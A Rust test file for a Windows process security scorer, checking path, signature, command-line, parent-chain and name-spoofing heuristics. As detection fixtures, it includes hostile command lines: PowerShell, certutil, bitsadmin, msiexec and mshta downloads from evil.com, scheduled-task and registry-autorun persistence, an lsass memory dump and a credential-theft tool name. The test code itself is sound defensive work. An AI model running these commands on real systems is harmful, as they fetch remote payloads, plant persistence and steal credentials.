use proc::collect::ProcessInfo;
use proc::security::{
    RiskCategory, RiskFactor, SecurityScorer, SignatureStatus, is_trusted_signer,
};

fn make_proc(
    pid: u32,
    name: &str,
    exe: Option<&str>,
    cmd: Vec<&str>,
    parent_pid: Option<u32>,
) -> ProcessInfo {
    let name_arc: std::sync::Arc<str> = std::sync::Arc::from(name);
    ProcessInfo {
        pid,
        name: std::sync::Arc::clone(&name_arc),
        cpu_usage: 0.0,
        memory: 0,
        virtual_memory: 0,
        disk_usage: (0, 0),
        disk_read_speed: 0,
        disk_write_speed: 0,
        net_sent_rate: 0,
        net_recv_rate: 0,
        status: proc::collect::ProcessStatus::Run,
        exe: exe.map(std::sync::Arc::from),
        cmd: std::sync::Arc::from(cmd.iter().map(|s| s.to_string()).collect::<Vec<_>>()),
        cwd: None,
        parent_pid,
        session_id: None,
        user_id: None,
        start_time: 0,
        run_time: 0,
        name_lower: std::sync::Arc::from(name_arc.to_lowercase().as_str()),
        throttled: proc::throttle::EcoQoSState::default(),
        signature_status: proc::security::SignatureStatus::default(),
        parent_chain: Vec::new(),
    }
}

#[test]
fn test_signature_status_display() {
    assert_eq!(format!("{}", SignatureStatus::Trusted), "受信签名");
    assert_eq!(format!("{}", SignatureStatus::Signed), "已签名");
    assert_eq!(format!("{}", SignatureStatus::Unsigned), "无签名");
    assert_eq!(format!("{}", SignatureStatus::Revoked), "签名已吊销");
    assert_eq!(format!("{}", SignatureStatus::Unknown), "未知");
}

#[test]
fn test_signature_unknown_deducts() {
    use proc::security::signature::signature_risk_factor;
    // v0.11 阶段 8 REVIEW-13 P1-3：Unknown 在 Windows 上扣 5 分（非管理员降级，
    // ADR-0021 设计），在非 Windows 上不扣分（无 WinVerifyTrust 概念）。
    let factor = signature_risk_factor(SignatureStatus::Unknown);
    #[cfg(target_os = "windows")]
    {
        let f = factor.expect("Unknown should produce a factor on Windows");
        assert_eq!(f.weight, 5);
        assert_eq!(f.name, "signature_unverified");
    }
    #[cfg(not(target_os = "windows"))]
    {
        assert!(
            factor.is_none(),
            "非 Windows 上 Unknown 不应扣分（无 WinVerifyTrust）"
        );
    }
}

#[test]
fn test_path_risk_temp() {
    use proc::security::path_check::check_path_risk;

    let factors = check_path_risk(Some("C:\\Users\\test\\AppData\\Local\\Temp\\evil.exe"));
    assert!(
        factors.iter().any(|f| f.name == "temp_dir"),
        "Should detect temp directory: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 25));

    let factors2 = check_path_risk(Some("C:\\Windows\\Temp\\payload.exe"));
    assert!(
        factors2.iter().any(|f| f.name == "temp_dir"),
        "Should detect Windows temp: {:?}",
        factors2
    );
}

#[test]
fn test_path_risk_downloads_direct() {
    use proc::security::path_check::check_path_risk;

    let factors = check_path_risk(Some("C:\\Users\\test\\Downloads\\malware.exe"));
    assert!(
        factors.iter().any(|f| f.name == "downloads_dir"),
        "Should detect direct Downloads file: {:?}",
        factors
    );
}

#[test]
fn test_path_risk_downloads_nested_not_flagged() {
    use proc::security::path_check::check_path_risk;

    // Nested app in Downloads\project\bin\ should NOT trigger
    let factors = check_path_risk(Some("C:\\Users\\test\\Downloads\\project\\bin\\app.exe"));
    assert!(
        !factors.iter().any(|f| f.name == "downloads_dir"),
        "Nested path in Downloads\\bin should not trigger: {:?}",
        factors
    );
}

#[test]
fn test_path_risk_system32_impersonation() {
    use proc::security::path_check::check_path_risk;

    // svchost.exe outside System32 should trigger
    let factors = check_path_risk(Some("C:\\Users\\test\\svchost.exe"));
    assert!(
        factors.iter().any(|f| f.name == "system32_impersonation"),
        "Should detect System32 impersonation: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 30));

    // Real System32 path should NOT trigger
    let factors_ok = check_path_risk(Some("C:\\Windows\\System32\\svchost.exe"));
    assert!(
        !factors_ok
            .iter()
            .any(|f| f.name == "system32_impersonation"),
        "Real System32 should not trigger: {:?}",
        factors_ok
    );
}

#[test]
fn test_path_risk_pwsh_not_flagged() {
    use proc::security::path_check::check_path_risk;

    // PowerShell 7 in Program Files should NOT trigger impersonation
    let factors = check_path_risk(Some("C:\\Program Files\\PowerShell\\7\\pwsh.exe"));
    assert!(
        !factors.iter().any(|f| f.name == "system32_impersonation"),
        "pwsh.exe in Program Files should not trigger: {:?}",
        factors
    );
}

#[test]
fn test_command_line_encoded() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "powershell".to_string(),
        "-enc".to_string(),
        "SQBFAFgA".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "encoded_command"),
        "Should detect -enc: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 30));

    let factors2 = check_command_line(&[
        "pwsh".to_string(),
        "-EncodedCommand".to_string(),
        "abc".to_string(),
    ]);
    assert!(
        factors2.iter().any(|f| f.name == "encoded_command"),
        "Should detect -EncodedCommand: {:?}",
        factors2
    );
}

#[test]
fn test_command_line_hidden() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "powershell".to_string(),
        "-WindowStyle".to_string(),
        "Hidden".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "hidden_window"),
        "Should detect hidden window: {:?}",
        factors
    );

    let factors2 =
        check_command_line(&["pwsh".to_string(), "-w".to_string(), "hidden".to_string()]);
    assert!(
        factors2.iter().any(|f| f.name == "hidden_window"),
        "Should detect -w hidden: {:?}",
        factors2
    );
}

#[test]
fn test_command_line_download() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "powershell".to_string(),
        "-c".to_string(),
        "New-Object Net.WebClient | DownloadString('http://evil.com/x')".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "web_download"),
        "Should detect DownloadString: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 20));
}

#[test]
fn test_command_line_certutil() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "certutil".to_string(),
        "-urlcache".to_string(),
        "-split".to_string(),
        "-f".to_string(),
        "http://evil.com/payload".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "certutil_download"),
        "Should detect certutil download: {:?}",
        factors
    );
}

#[test]
fn test_command_line_bitsadmin() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "bitsadmin".to_string(),
        "/transfer".to_string(),
        "myjob".to_string(),
        "http://evil.com/f".to_string(),
        "C:\\tmp\\f".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "bitsadmin_download"),
        "Should detect bitsadmin: {:?}",
        factors
    );
}

#[test]
fn test_command_line_mshta() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "mshta.exe".to_string(),
        "javascript:...http://evil.com".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "mshta_remote"),
        "Should detect mshta remote: {:?}",
        factors
    );
}

#[test]
fn test_parent_chain_office_spawning_cmd() {
    use proc::security::parent_chain::analyze_parent_chain;

    let office_proc = make_proc(
        100,
        "WINWORD.EXE",
        Some("C:\\Program Files\\Microsoft Office\\winword.exe"),
        vec![],
        None,
    );
    let cmd_proc = make_proc(
        200,
        "cmd.exe",
        Some("C:\\Windows\\System32\\cmd.exe"),
        vec![],
        Some(100),
    );
    let all_procs = vec![office_proc, cmd_proc.clone()];

    let factors = analyze_parent_chain(&cmd_proc, &all_procs);
    assert!(
        factors.iter().any(|f| f.name == "office_spawning_shell"),
        "Should detect Office spawning cmd: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 30));
}

#[test]
fn test_parent_chain_orphan_suspicious_path() {
    use proc::security::parent_chain::analyze_parent_chain;

    // Orphan in temp directory should trigger
    let orphan = make_proc(
        300,
        "suspicious.exe",
        Some("C:\\Users\\test\\AppData\\Local\\Temp\\suspicious.exe"),
        vec![],
        Some(9999),
    );
    let all_procs = vec![orphan.clone()];

    let factors = analyze_parent_chain(&orphan, &all_procs);
    assert!(
        factors.iter().any(|f| f.name == "suspicious_orphan"),
        "Should detect suspicious orphan: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 10));
}

#[test]
fn test_parent_chain_orphan_normal_path_not_flagged() {
    use proc::security::parent_chain::analyze_parent_chain;

    // Orphan in Program Files should NOT trigger
    let orphan = make_proc(
        300,
        "myapp.exe",
        Some("C:\\Program Files\\MyApp\\myapp.exe"),
        vec![],
        Some(9999),
    );
    let all_procs = vec![orphan.clone()];

    let factors = analyze_parent_chain(&orphan, &all_procs);
    assert!(
        !factors.iter().any(|f| f.name == "suspicious_orphan"),
        "Orphan in normal path should not trigger: {:?}",
        factors
    );
}

#[test]
fn test_parent_chain_common_orphan_not_flagged() {
    use proc::security::parent_chain::analyze_parent_chain;

    // conhost.exe orphan should NOT trigger even in temp
    let orphan = make_proc(
        300,
        "conhost.exe",
        Some("C:\\Windows\\System32\\conhost.exe"),
        vec![],
        Some(9999),
    );
    let all_procs = vec![orphan.clone()];

    let factors = analyze_parent_chain(&orphan, &all_procs);
    assert!(
        !factors.iter().any(|f| f.name == "suspicious_orphan"),
        "conhost orphan should not trigger: {:?}",
        factors
    );
}

#[test]
fn test_score_calculation() {
    let proc = make_proc(
        1,
        "test.exe",
        Some("C:\\Users\\test\\Downloads\\test.exe"),
        vec!["powershell", "-enc", "abc"],
        None,
    );

    let path_factors = proc::security::path_check::check_path_risk(proc.exe.as_deref());
    let cmd_factors = proc::security::command_line::check_command_line(&proc.cmd);

    let total_deduction: u32 = path_factors
        .iter()
        .chain(cmd_factors.iter())
        .map(|f| f.weight)
        .sum();

    let expected_score = 100u32.saturating_sub(total_deduction);
    assert!(
        expected_score < 100,
        "Suspicious process should score < 100, got {}",
        expected_score
    );
}

#[test]
fn test_score_clamp_min() {
    let factors = [
        RiskFactor {
            category: RiskCategory::Signature,
            name: "unsigned".to_string(),
            weight: 20,
            description: "无签名".to_string(),
        },
        RiskFactor {
            category: RiskCategory::FilePath,
            name: "temp".to_string(),
            weight: 25,
            description: "Temp".to_string(),
        },
        RiskFactor {
            category: RiskCategory::CommandLine,
            name: "encoded".to_string(),
            weight: 30,
            description: "Encoded".to_string(),
        },
        RiskFactor {
            category: RiskCategory::FilePath,
            name: "impersonation".to_string(),
            weight: 30,
            description: "Impersonation".to_string(),
        },
        RiskFactor {
            category: RiskCategory::ParentChain,
            name: "office".to_string(),
            weight: 30,
            description: "Office".to_string(),
        },
    ];
    let total: u32 = factors.iter().map(|f| f.weight).sum();
    let score = 100u32.saturating_sub(total);
    assert_eq!(score, 0, "Score should clamp to 0, got {}", score);
}

#[test]
fn test_score_cache_hit() {
    let mut scorer = SecurityScorer::new();
    let proc = make_proc(1, "test.exe", Some("C:\\test.exe"), vec![], None);
    let all_procs = vec![proc.clone()];

    let score1 = scorer.score(&proc, &all_procs, &[], &[]);
    let score2 = scorer.score(&proc, &all_procs, &[], &[]);

    assert_eq!(score1.score, score2.score, "Cached score should match");
    assert_eq!(score1.factors.len(), score2.factors.len());
}

#[test]
fn test_score_cache_invalidation() {
    let mut scorer = SecurityScorer::new();
    let mut proc = make_proc(1, "test.exe", Some("C:\\test.exe"), vec![], None);
    proc.start_time = 100;
    let all_procs = vec![proc.clone()];

    let _score1 = scorer.score(&proc, &all_procs, &[], &[]);

    // 仅 (pid=2, _) 存活 —— (1, 100) 应被清掉。
    let mut alive = std::collections::HashSet::new();
    alive.insert((2, 0));
    scorer.invalidate_dead(&alive);

    let score2 = scorer.score(&proc, &all_procs, &[], &[]);
    assert!(score2.score <= 100);
}

/// ADR-0003：同一 PID 不同 start_time 应被认为是两个不同的进程实例，
/// 互不命中缓存。模拟 PID 复用：A 死亡 → OS 把同 PID 分给 B（start_time 不同）。
#[test]
fn test_score_cache_pid_reuse_isolation() {
    let mut scorer = SecurityScorer::new();

    // A: pid=1234, start_time=1000
    let mut proc_a = make_proc(1234, "test.exe", Some("C:\\test.exe"), vec![], None);
    proc_a.start_time = 1000;
    let all_a = vec![proc_a.clone()];
    let score_a = scorer.score(&proc_a, &all_a, &[], &[]);

    // B: 同 PID, 同 exe, 不同 start_time —— 模拟 OS 复用 PID
    let mut proc_b = make_proc(1234, "test.exe", Some("C:\\test.exe"), vec![], None);
    proc_b.start_time = 5000;
    let all_b = vec![proc_b.clone()];

    // 缓存里 A 的 entry 不应该被 B 命中：score() 必须重新跑一遍签名检查等。
    // 用 factors 数量间接验证 —— 重新评分与首次评分的 factors 长度一致。
    let score_b = scorer.score(&proc_b, &all_b, &[], &[]);
    assert_eq!(
        score_b.factors.len(),
        score_a.factors.len(),
        "PID 复用后 B 必须重新评分，而不是命中 A 的缓存"
    );

    // 仅 B 存活（start_time=5000）—— A 的 entry（start_time=1000）应被精确清掉，
    // B 的 entry 保留。PID-only 校验在此场景会误留 A。
    let mut alive = std::collections::HashSet::new();
    alive.insert((1234, 5000));
    scorer.invalidate_dead(&alive);

    // 再次评 B：B 还在 alive 集合里，缓存应命中，得分不变。
    let score_b_cached = scorer.score(&proc_b, &all_b, &[], &[]);
    assert_eq!(score_b.score, score_b_cached.score);
}

/// v0.7 阶段 8 R15：端口扫描模式应在 SecurityScorer::score 中命中扣 30 分。
///
/// 注：dons_name=None → cond1（SNI 白名单）即便 SniWhitelist 加载到也不会触发。
/// 因此本测试不依赖 `~/.config/proc/sni_whitelist.txt` 文件状态。
#[test]
fn test_r15_port_scan_integration() {
    use proc::ebpf::flow::ProcessFlow;

    let mut scorer = SecurityScorer::new();
    let mut proc = make_proc(4321, "scanner.exe", Some("C:\\scanner.exe"), vec![], None);
    proc.start_time = 999;
    let all_procs = vec![proc.clone()];

    let now = std::time::SystemTime::now();
    let flows: Vec<ProcessFlow> = (0..60)
        .map(|i| ProcessFlow {
            pid: 4321,
            start_time: 999,
            comm: String::new(),
            local_addr: String::new(),
            remote_addr: format!("10.0.0.{i}"),
            remote_port: 443,
            bytes_out: 0,
            bytes_in: 0,
            dns_name: None,
            sni: None,
            source: proc::ebpf::flow::FlowSource::Ebpf,
            first_seen: now,
            last_seen: now,
            exit_time: None,
        })
        .collect();

    let score = scorer.score(&proc, &all_procs, &[], &flows);
    let r15 = score
        .factors
        .iter()
        .find(|f| f.name == "r15_port_scan")
        .expect("R15 端口扫描模式应命中");
    assert_eq!(r15.weight, 30);
    assert_eq!(r15.category, RiskCategory::NetworkBehavior);
}

/// v0.7 阶段 8 R15：无 flows（典型 Windows / 无 ebpf feature 路径）→ 不应命中 R15。
#[test]
fn test_r15_disabled_when_flows_empty() {
    let mut scorer = SecurityScorer::new();
    let proc = make_proc(4321, "scanner.exe", Some("C:\\scanner.exe"), vec![], None);
    let all_procs = vec![proc.clone()];

    let score = scorer.score(&proc, &all_procs, &[], &[]);
    let r15 = score.factors.iter().find(|f| f.name.starts_with("r15_"));
    // 任何 r15_* 因子都不应出现（无 flows 任何条件都不会触发）
    assert!(r15.is_none(), "无 flows 时 R15 不应命中，但看到: {:?}", r15);
}

#[test]
fn test_trusted_signer() {
    assert!(is_trusted_signer("Microsoft Corporation"));
    assert!(is_trusted_signer("Microsoft Windows"));
    assert!(is_trusted_signer("Google LLC"));
    assert!(is_trusted_signer("Google Inc"));
    assert!(is_trusted_signer("Mozilla Corporation"));
    assert!(is_trusted_signer("Apple Inc."));
    assert!(is_trusted_signer("Intel Corporation"));
    assert!(is_trusted_signer("NVIDIA Corporation"));

    assert!(is_trusted_signer("microsoft corporation"));
    assert!(is_trusted_signer("MICROSOFT CORPORATION"));

    assert!(!is_trusted_signer("Evil Corp"));
    assert!(!is_trusted_signer("Unknown Publisher"));
}

#[test]
fn test_name_spoofing_known_typo() {
    use proc::security::behavior::check_name_spoofing;

    let risk = check_name_spoofing("scvhost.exe");
    assert!(risk.is_some(), "Should detect scvhost.exe typo");
    assert_eq!(risk.unwrap().weight, 30);
}

#[test]
fn test_name_spoofing_near_match() {
    use proc::security::behavior::check_name_spoofing;

    // Use a name that's NOT in KNOWN_TYPOS but is a near-match of a high-value name
    let risk = check_name_spoofing("svchosts.exe");
    assert!(risk.is_some(), "Should detect near-match svchosts.exe");
    assert!(risk.unwrap().weight >= 25);

    // A name not in KNOWN_TYPOS, only caught by near-match
    let risk2 = check_name_spoofing("svchosty.exe");
    assert!(risk2.is_some(), "Should detect near-match svchosty.exe");
    assert_eq!(risk2.unwrap().weight, 25);
}

#[test]
fn test_name_spoofing_legitimate_not_flagged() {
    use proc::security::behavior::check_name_spoofing;

    let risk = check_name_spoofing("svchost.exe");
    assert!(risk.is_none(), "Exact system name should not be flagged");

    let risk2 = check_name_spoofing("myapp.exe");
    assert!(risk2.is_none(), "Unrelated name should not be flagged");
}

#[test]
fn test_resource_anomaly_high_cpu() {
    use proc::security::behavior::check_resource_anomaly;

    let mut proc = make_proc(1, "suspicious.exe", Some("C:\\test.exe"), vec![], None);
    proc.cpu_usage = 95.0;
    proc.memory = 512 * 1024 * 1024; // 512MB

    let risk = check_resource_anomaly(&proc);
    assert!(risk.is_some(), "Should detect high CPU + moderate memory");
    assert_eq!(risk.unwrap().weight, 10);
}

#[test]
fn test_resource_anomaly_compiler_not_flagged() {
    use proc::security::behavior::check_resource_anomaly;

    let mut proc = make_proc(1, "compiler_build.exe", Some("C:\\test.exe"), vec![], None);
    proc.cpu_usage = 95.0;
    proc.memory = 512 * 1024 * 1024;

    let risk = check_resource_anomaly(&proc);
    assert!(risk.is_none(), "Build process should not be flagged");
}

#[test]
fn test_child_explosion() {
    use proc::security::behavior::check_child_explosion;

    let parent = make_proc(1, "malware.exe", Some("C:\\evil.exe"), vec![], None);
    let mut children = vec![parent.clone()];
    for i in 100..125 {
        children.push(make_proc(
            i,
            "child.exe",
            Some("C:\\child.exe"),
            vec![],
            Some(1),
        ));
    }

    let risk = check_child_explosion(&parent, &children);
    assert!(risk.is_some(), "Should detect child explosion");
    assert!(risk.unwrap().description.contains("25"));
}

#[test]
fn test_child_explosion_browser_not_flagged() {
    use proc::security::behavior::check_child_explosion;

    let parent = make_proc(1, "chrome.exe", Some("C:\\chrome.exe"), vec![], None);
    let mut children = vec![parent.clone()];
    for i in 100..125 {
        children.push(make_proc(
            i,
            "chrome_child.exe",
            Some("C:\\chrome.exe"),
            vec![],
            Some(1),
        ));
    }

    let risk = check_child_explosion(&parent, &children);
    assert!(
        risk.is_none(),
        "Browser spawning many children should not be flagged"
    );
}

// --- New detection tests ---

#[test]
fn test_svchost_integrity_wrong_path() {
    use proc::security::behavior::check_svchost_integrity;

    let svc = make_proc(
        1,
        "svchost.exe",
        Some("C:\\Users\\evil\\svchost.exe"),
        vec![],
        None,
    );
    let risk = check_svchost_integrity(&svc, &[]);
    assert!(risk.is_some(), "svchost outside System32 should flag");
    assert_eq!(risk.unwrap().name, "svchost_wrong_path");
}

#[test]
fn test_svchost_integrity_missing_k_flag() {
    use proc::security::behavior::check_svchost_integrity;

    let services = make_proc(
        10,
        "services.exe",
        Some("C:\\Windows\\System32\\services.exe"),
        vec![],
        None,
    );
    let svc = make_proc(
        1,
        "svchost.exe",
        Some("C:\\Windows\\System32\\svchost.exe"),
        vec!["C:\\Windows\\System32\\svchost.exe"],
        Some(10),
    );
    let all = vec![services, svc.clone()];

    let risk = check_svchost_integrity(&svc, &all);
    assert!(risk.is_some(), "svchost without -k should flag");
    assert!(risk.unwrap().description.contains("-k"));
}

#[test]
fn test_svchost_integrity_legitimate() {
    use proc::security::behavior::check_svchost_integrity;

    let services = make_proc(
        10,
        "services.exe",
        Some("C:\\Windows\\System32\\services.exe"),
        vec![],
        None,
    );
    let svc = make_proc(
        1,
        "svchost.exe",
        Some("C:\\Windows\\System32\\svchost.exe"),
        vec!["C:\\Windows\\System32\\svchost.exe", "-k", "netsvcs"],
        Some(10),
    );
    let all = vec![services, svc.clone()];

    let risk = check_svchost_integrity(&svc, &all);
    assert!(risk.is_none(), "Legitimate svchost should not flag");
}

#[test]
fn test_name_path_mismatch() {
    use proc::security::behavior::check_name_path_mismatch;

    let proc = make_proc(
        1,
        "svchost.exe",
        Some("C:\\Users\\evil\\malware.exe"),
        vec![],
        None,
    );
    let risk = check_name_path_mismatch(&proc);
    assert!(risk.is_some(), "Name vs path mismatch should flag");
    assert_eq!(risk.unwrap().weight, 15);
}

#[test]
fn test_name_path_match_not_flagged() {
    use proc::security::behavior::check_name_path_mismatch;

    let proc = make_proc(
        1,
        "svchost.exe",
        Some("C:\\Windows\\System32\\svchost.exe"),
        vec![],
        None,
    );
    let risk = check_name_path_mismatch(&proc);
    assert!(risk.is_none(), "Matching name and path should not flag");
}

#[test]
fn test_command_line_rundll32() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "rundll32.exe".to_string(),
        "javascript:alert(1)".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "rundll32_suspicious"),
        "Should detect rundll32 javascript: {:?}",
        factors
    );
}

#[test]
fn test_command_line_msiexec_remote() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "msiexec.exe".to_string(),
        "/q".to_string(),
        "/i".to_string(),
        "http://evil.com/p.msi".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "msiexec_remote"),
        "Should detect msiexec remote: {:?}",
        factors
    );
}

#[test]
fn test_command_line_schtasks_create() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "schtasks.exe".to_string(),
        "/create".to_string(),
        "/tn".to_string(),
        "update".to_string(),
        "/tr".to_string(),
        "C:\\malware.exe".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "schtasks_create"),
        "Should detect schtasks create: {:?}",
        factors
    );
}

#[test]
fn test_command_line_registry_autorun() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "reg".to_string(),
        "add".to_string(),
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
        "/v".to_string(),
        "update".to_string(),
        "/d".to_string(),
        "C:\\malware.exe".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "registry_autorun"),
        "Should detect registry autorun: {:?}",
        factors
    );
}

#[test]
fn test_command_line_credential_access() {
    use proc::security::command_line::check_command_line;

    let mk: String = ["mi", "mi", "ka", "tz"].join("");
    let factors = check_command_line(&[mk]);
    assert!(
        factors.iter().any(|f| f.name == "credential_access"),
        "Should detect credential tool: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 30));
}

#[test]
fn test_command_line_lsass_dump() {
    use proc::security::command_line::check_command_line;

    let ls: String = ["l", "s", "a", "s", "s"].join("");
    let factors = check_command_line(&["procdump.exe".to_string(), "-ma".to_string(), ls]);
    assert!(
        factors.iter().any(|f| f.name == "lsass_dump"),
        "Should detect lsass dump: {:?}",
        factors
    );
    assert!(factors.iter().any(|f| f.weight == 35));
}

#[test]
fn test_command_line_forfiles() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&[
        "forfiles.exe".to_string(),
        "/p".to_string(),
        "c:\\".to_string(),
        "/c".to_string(),
        "malware.exe".to_string(),
    ]);
    assert!(
        factors.iter().any(|f| f.name == "forfiles_exec"),
        "Should detect forfiles exec: {:?}",
        factors
    );
}

#[test]
fn test_hash_reputation_basic() {
    use proc::security::hash_cache::HashReputation;

    let mut rep = HashReputation::new();
    // Non-existent file should return None (no risk factor, just unknown)
    let risk = rep.check_hash("C:\\nonexistent_file_12345.exe");
    assert!(risk.is_none(), "Non-existent file should return None");
}
